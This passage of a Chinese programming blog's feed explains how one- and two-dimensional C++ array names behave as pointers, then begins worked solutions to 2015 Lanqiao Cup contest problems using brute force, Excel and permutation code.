    <id>https://zss192.github.io/2021/04/12/%E4%B8%80%E7%BB%B4%E6%95%B0%E7%BB%84%E5%90%8D%E5%92%8C%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E5%90%8D%E7%9A%84%E5%8C%BA%E5%88%AB/</id>
    <published>2021-04-12T06:39:52.000Z</published>
    <updated>2021-06-10T10:19:42.962Z</updated>
    
    <content type="html"><![CDATA[<h1>一维数组</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> nums[<span class="number">4</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line">cout&lt;&lt;nums&lt;&lt;endl;    <span class="comment">//0x404060</span></span><br><span class="line">cout&lt;&lt;nums+<span class="number">1</span>&lt;&lt;endl;  <span class="comment">//0x404064</span></span><br></pre></td></tr></table></figure><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210412143637141.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><p>一维数组，数组名是个指针，指向nums[0]，其数值就是nums[0]的地址，这里输出了0x404060</p><p>nums+1相当于nums[1]的地址，而int类型占4个字节，所以nums+1会输出0x404064</p><h1>二维数组</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> nums[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line">cout&lt;&lt;nums&lt;&lt;endl;    <span class="comment">//0x404080</span></span><br><span class="line">cout&lt;&lt;nums+<span class="number">1</span>&lt;&lt;endl;  <span class="comment">//0x404088</span></span><br></pre></td></tr></table></figure><p>其数组名也是个指针，可以看到num+1比nums大了8而不是一个int类型的4字节，这是为什么呢？</p><blockquote><p>图源：<a href="https://www.shuzhiduo.com/A/n2d9yBV4dD/">C/C++二维数组名和二级指针</a></p></blockquote><p>实际上，不管是一维还是多维数组，都是内存中一块线性连续空间，因此在内存级别上，其实都只是一维。</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210412143648645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210412143656453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><p>说明：a是二维数组名，它是一个指针，指向一个含有4个元素的int数组</p><p>看到这里也许你就明白了，实际上上面的代码中nums是其第一个元素即第一行的地址，num+1的值为下一行的地址</p><p>或者说nums可以看成一维数组，但其元素是其行向量，即一个元素是它的一行</p><p>区别：数组名指向第一个元素</p><p>在一维数组(nums[4])中数组名指向的是第一个元素即nums[0]，而在二维数组(nums[2][2])中数组名指向的也是第一个元素但是是一行数组(nums[0])</p><blockquote><p>可以理解为一维数组nums+1会向右移动一个格子，而二维数组nums+1会向右移动二维数组一行的格子数</p></blockquote><h1>例子</h1><p>如next_permutation函数对数组排列，用法为next_permutation(数组首地址，数组尾地址+1)</p><p><strong>一维数组全排列代码如下</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> nums[<span class="number">4</span>]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">        cout&lt;&lt;nums[i];</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">&#125;<span class="keyword">while</span>(<span class="built_in">next_permutation</span>(nums,nums+<span class="number">4</span>));</span><br></pre></td></tr></table></figure><p>其中nums+1会移动一个数字，所以nums+4就表示数组的尾地址+1</p><p><strong>二维数组全排列代码如下</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> nums[<span class="number">2</span>][<span class="number">2</span>]=&#123;&#123;<span class="number">1</span>,<span class="number">2</span>&#125;,&#123;<span class="number">3</span>,<span class="number">4</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">2</span>;j++)</span><br><span class="line">            cout&lt;&lt;nums[i][j];</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">&#125;<span class="keyword">while</span>(<span class="built_in">next_permutation</span>(*nums,*nums+<span class="number">4</span>)); <span class="comment">//特别注意这里要用*nums</span></span><br></pre></td></tr></table></figure><p>同样是四个数字但却不能用nums+4，如果你看懂文章开始的讲解你就会明白nums+1会指向下一行的首地址。</p><p>nums+4表示数组第4行(从0开始)首地址，但数组总共就两行，而且next_permutation函数第二个参数填的是数组尾地址+1，也就是数字4的下一个地址，所以肯定不能像一维数组一样填nums+4</p><p><strong>但这里为什么填</strong>(*nums,*nums+4)呢？</p><p>nums是数组第一个元素的指针，而数组第一个元素是什么？</p><p>还是一个数组(第一行)，所以<strong>nums是一个指向数组的指针</strong></p><p>如果你输出nums和*nums你会发现结果一样，这该怎么解释呢？</p><p>nums是nums[0]的地址即第一行的首地址。</p><p>而*nums是nums[0][0]的地址，所以他们输出一样，实际上都是同一个位置，但+1操作输出就会不一样</p><p>综上所述，*nums+4就可以表示尾地址+1</p><h1>小测试</h1><p>你学会了吗，试着说出下面的输出结果</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> nums[<span class="number">2</span>][<span class="number">2</span>]=&#123;&#123;<span class="number">1</span>,<span class="number">2</span>&#125;,&#123;<span class="number">3</span>,<span class="number">4</span>&#125;&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout.<span class="built_in">fill</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    cout&lt;&lt;left&lt;&lt; <span class="built_in">setw</span>(<span class="number">10</span>)&lt;&lt;<span class="string">&quot;nums&quot;</span>&lt;&lt;nums&lt;&lt;endl;   <span class="comment">//0x404080</span></span><br><span class="line">    cout&lt;&lt;left&lt;&lt; <span class="built_in">setw</span>(<span class="number">10</span>)&lt;&lt;<span class="string">&quot;nums+1&quot;</span>&lt;&lt;nums+<span class="number">1</span>&lt;&lt;endl;   <span class="comment">//</span></span><br><span class="line">    cout&lt;&lt;left&lt;&lt; <span class="built_in">setw</span>(<span class="number">10</span>)&lt;&lt;<span class="string">&quot;*nums&quot;</span>&lt;&lt;*nums&lt;&lt;endl; <span class="comment">//</span></span><br><span class="line">    cout&lt;&lt;left&lt;&lt; <span class="built_in">setw</span>(<span class="number">10</span>)&lt;&lt;<span class="string">&quot;*nums+1&quot;</span>&lt;&lt;*nums+<span class="number">1</span>&lt;&lt;endl; <span class="comment">//</span></span><br><span class="line">    cout&lt;&lt;left&lt;&lt; <span class="built_in">setw</span>(<span class="number">10</span>)&lt;&lt;<span class="string">&quot;**nums&quot;</span>&lt;&lt;**nums&lt;&lt;endl; <span class="comment">//</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>揭晓答案</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> nums[<span class="number">2</span>][<span class="number">2</span>]=&#123;&#123;<span class="number">1</span>,<span class="number">2</span>&#125;,&#123;<span class="number">3</span>,<span class="number">4</span>&#125;&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout.<span class="built_in">fill</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    cout&lt;&lt;left&lt;&lt; <span class="built_in">setw</span>(<span class="number">10</span>)&lt;&lt;<span class="string">&quot;nums&quot;</span>&lt;&lt;nums&lt;&lt;endl; <span class="comment">//0x404080</span></span><br><span class="line">    cout&lt;&lt;left&lt;&lt; <span class="built_in">setw</span>(<span class="number">10</span>)&lt;&lt;<span class="string">&quot;nums+1&quot;</span>&lt;&lt;nums+<span class="number">1</span>&lt;&lt;endl; <span class="comment">//0x404088</span></span><br><span class="line">    cout&lt;&lt;left&lt;&lt; <span class="built_in">setw</span>(<span class="number">10</span>)&lt;&lt;<span class="string">&quot;*nums&quot;</span>&lt;&lt;*nums&lt;&lt;endl; <span class="comment">//0x404080</span></span><br><span class="line">    cout&lt;&lt;left&lt;&lt; <span class="built_in">setw</span>(<span class="number">10</span>)&lt;&lt;<span class="string">&quot;*nums+1&quot;</span>&lt;&lt;*nums+<span class="number">1</span>&lt;&lt;endl; <span class="comment">//0x404084</span></span><br><span class="line">    cout&lt;&lt;left&lt;&lt; <span class="built_in">setw</span>(<span class="number">10</span>)&lt;&lt;<span class="string">&quot;**nums&quot;</span>&lt;&lt;**nums&lt;&lt;endl; <span class="comment">//1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>拓展</h1><p>二维数组名为什么不能直接赋值给二级指针？<br>答：一句话来说就是二维数组名是行指针，也就是指向数组的指针。而二级指针是指向指针的指针，它们不是同一类型。</p><p>具体分析如下</p><p>1.对二维数组名解引用也就是对行指针解引用能得到列指针，再次解引用能得到具体的数值</p><p>2.如int **p=nums，nums是行指针，也就是nums[0]的地址即int **p=&amp;nums[0]</p><p>而nums[0]的地址其实也是nums[0][0]的地址，即int **p=&amp;nums[0][0]</p><p>p是指向nums[0][0]的指针，*p就能够得到nums[0][0]的值，假设为1</p><p>而**p表示对地址为1的地址取值肯定会出错</p><blockquote><p>对二维数组名两次解引用才能得到具体数值，而将二维数组名赋值给二级指针，一次解引用就能得到具体数值。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;一维数组&lt;/h1&gt;
&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br</summary>
      
    
    
    
    <category term="算法(C++)" scheme="https://zss192.github.io/categories/%E7%AE%97%E6%B3%95-C/"/>
    
    
    <category term="算法(C++)" scheme="https://zss192.github.io/tags/%E7%AE%97%E6%B3%95-C/"/>
    
  </entry>
  
  <entry>
    <title>2015年第六届蓝桥杯C/C++B组省赛题目解析</title>
    <link href="https://zss192.github.io/2021/04/09/2015%E5%B9%B4%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AFCC++B%E7%BB%84%E7%9C%81%E8%B5%9B%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90/"/>
    <id>https://zss192.github.io/2021/04/09/2015%E5%B9%B4%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E6%A1%A5%E6%9D%AFCC++B%E7%BB%84%E7%9C%81%E8%B5%9B%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90/</id>
    <published>2021-04-09T09:22:28.000Z</published>
    <updated>2021-04-09T09:36:39.963Z</updated>
    
    <content type="html"><![CDATA[<h1>1.奖券数目</h1><p>有些人很迷信数字，比如带“4”的数字，认为和“死”谐音，就觉得不吉利。<br>虽然这些说法纯属无稽之谈，但有时还要迎合大众的需求。某抽奖活动的奖券号码是5位数（10000-99999），要求其中不要出现带“4”的号码，主办单位请你计算一下，如果任何两张奖券不重号，最多可发出奖券多少张。</p><ul><li>思路一：代码解题</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(string n)</span>   <span class="comment">//这里用字符判断，也可以用int类型%10判断</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n.<span class="built_in">size</span>(); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(n[i]==<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">10000</span>; i &lt;= <span class="number">99999</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">check</span>(<span class="built_in">to_string</span>(i)))</span><br><span class="line">            sum++;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;sum&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>思路二：手算</li></ul><p>总共5位数字，最高位不能用0和4可用位数为8，剩下四位数字除4外都可以用每位可用数字为9位</p><p>最终结果为8<em>9</em>9<em>9</em>9=52488</p><h1>2.星系炸弹</h1><p>在X星系的广袤空间中漂浮着许多X星人造“炸弹”，用来作为宇宙中的路标。每个炸弹都可以设定多少天之后爆炸。</p><p>比如：阿尔法炸弹2015年1月1日放置，定时为15天，则它在2015年1月16日爆炸。</p><p>有一个贝塔炸弹，2014年11月9日放置，定时为1000天，请你计算它爆炸的准确日期。</p><p>请填写该日期，格式为 yyyy-mm-dd 即4位年份2位月份2位日期。比如：2015-02-19请严格按照格式书写。不能出现其它文字或符号。</p><blockquote><p>蓝桥杯每年基本都会有一道关于日期的问题，基本都可以用以下几种方法解决</p></blockquote><ul><li>思路一：代码解题</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//不推荐用代码解题，费时(用下面的方法更快)，但必须要会</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> month[<span class="number">13</span>]=&#123;<span class="number">0</span>,<span class="number">31</span>,<span class="number">28</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>&#125;; <span class="comment">//2014不是闰年，初始2月为28天</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isLunar</span><span class="params">(<span class="keyword">int</span> year)</span>  <span class="comment">//判断是否是闰年</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(year%<span class="number">400</span>==<span class="number">0</span>||(year%<span class="number">4</span>==<span class="number">0</span>&amp;&amp;year%<span class="number">100</span>!=<span class="number">0</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> y=<span class="number">2014</span>,m=<span class="number">11</span>,d=<span class="number">9</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">1000</span>; i++) <span class="comment">//1000天相当于1000次循环</span></span><br><span class="line">    &#123;  </span><br><span class="line">        d++;</span><br><span class="line">        <span class="keyword">if</span>(d&gt;month[m]) <span class="comment">//如果天数大于当月天数</span></span><br><span class="line">        &#123;</span><br><span class="line">            m++;    <span class="comment">//月份+1</span></span><br><span class="line">            d=<span class="number">1</span>;    <span class="comment">//天数置1</span></span><br><span class="line">            <span class="keyword">if</span>(m&gt;<span class="number">12</span>)    <span class="comment">//如果月数大于12，将月数置1年份加一</span></span><br><span class="line">            &#123;</span><br><span class="line">                m=<span class="number">1</span>;</span><br><span class="line">                y++;</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">isLunar</span>(y))  <span class="comment">//年份加一的时候判断当前年份是否是闰年</span></span><br><span class="line">                    month[<span class="number">2</span>]=<span class="number">29</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    month[<span class="number">2</span>]=<span class="number">28</span>;   <span class="comment">//注意不是闰年要把2月恢复成28天</span></span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;y&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;m&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;d&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>思路三：Excel解题</li></ul><p>在第一个单元格输入2014/11/9，然后向下拉到1001即可</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210409171828119.png"  alt="在这里插入图片描述"></p><p>如果不想向下一个一个拉，也可以选中这一列用序列填充，如图所示，1000天不到3年，填到2020年即可<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210409171848210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"><br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210409171853824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><p>也可以直接输入加1000</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210409171936942.png"  alt="在这里插入图片描述"></p><ul><li>思路三：Windows自带计算器解题</li></ul><p>首先估计大概日期，起始大概是2015年，1000天后大概不到2018年，用windows的计算器功能先选到2018年1月1日<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210409172004583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><p>可以看到2018年1月1日相差1149天，再往前调调可以发现2017年8月5日正好差1000天</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210409172016397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><h1>3.三羊献瑞</h1><p>观察下面的加法算式：<br><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/20210409172040511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pzczE5Mg==,size_16,color_FFFFFF,t_70"  alt="在这里插入图片描述"></p><p>其中，相同的汉字代表相同的数字，不同的汉字代表不同的数字。</p><p>请你填写“三羊献瑞”所代表的4位数字（答案唯一），不要填写任何多余内容。</p><blockquote><p>主要解决两个问题：列举所有排列和判断排列是否满足题意</p></blockquote><ul><li>思路一：用next_permutation全排列函数</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> nums[<span class="number">10</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">do</span>  <span class="comment">//全排列会列举10个数的所有排列组合</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(nums[<span class="number">1</span>]==<span class="number">0</span>||nums[<span class="number">5</span>]==<span class="number">0</span>) <span class="keyword">continue</span>; <span class="comment">//最高位不能为0</span></span><br><span class="line">        <span class="keyword">int</span> x=<span class="number">1000</span>*nums[<span class="number">1</span>]+<span class="number">100</span>*nums[<span class="number">2</span>]+<span class="number">10</span>*nums[<span class="number">3</span>]+nums[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">int</span> y=<span class="number">1000</span>*nums[<span class="number">5</span>]+<span class="number">100</span>*nums[<span class="number">6</span>]+<span class="number">10</span>*nums[<span class="number">7</span>]+nums[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">int</span> z=<span class="number">10000</span>*nums[<span class="number">5</span>]+<span class="number">1000</span>*nums[<span class="number">6</span>]+<span class="number">100</span>*nums[<span class="number">3</span>]+<span class="number">10</span>*nums[<span class="number">2</span>]+nums[<span class="number">8</span>];</span><br><span class="line">        <span class="keyword">if</span>(x+y==z)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;x&lt;&lt;endl;</span><br><span class="line">            cout&lt;&lt;y&lt;&lt;endl;</span><br><span class="line">            cout&lt;&lt;z&lt;&lt;endl;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot;三羊献瑞代表的数字为：&quot;</span>&lt;&lt;y&lt;&lt;endl;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="built_in">next_permutation</span>(nums,nums+<span class="number">10</span>)); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//来源：https://www.jianshu.com/p/3b2eea3c5eff</span></span><br><span class="line"><span class="comment">//原本我是用全排列然后取前4位为祥瑞生辉，后四位为三羊献瑞，然后判断但是这样要判断两数相加的结果中一一对应且&#x27;气&#x27;不能和两个四字成语重复</span></span><br></pre></td></tr></table></figure><ul><li>思路二：用dfs列举所有排列判断</li></ul><p>判断思想和思路一一致，但列举排列采用的dfs，前几天学了dfs但没想到用这个看来还是要多练练</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> nums[<span class="number">8</span>];</span><br><span class="line"><span class="keyword">bool</span> visited[<span class="number">10</span>];</span><br><span class="line"><span class="keyword">int</span> x,y,z;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> step)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//前8位都排好了则判断下是否满足要求</span></span><br><span class="line">    <span class="keyword">if</span>(step==<span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        x=nums[<span class="number">0</span>]*<span class="number">1000</span> + nums[<span class="number">1</span>]*<span class="number">100</span> + nums[<span class="number">2</span>]*<span class="number">10</span> + nums[<span class="number">3</span>];</span><br><span class="line">        y=nums[<span class="number">4</span>]*<span class="number">1000</span> + nums[<span class="number">5</span>]*<span class="number">100</span> + nums[<span class="number">6</span>]*<span class="number">10</span> + nums[<span class="number">1</span>];</span><br><span class="line">        z=nums[<span class="number">4</span>]*<span class="number">10000</span> + nums[<span class="number">5</span>]*<span class="number">1000</span> + nums[<span class="number">2</span>]*<span class="number">100</span> + nums[<span class="number">1</span>]*<span class="number">10</span> + nums[<span class="number">7</span>];</span><br><span class="line">        <span 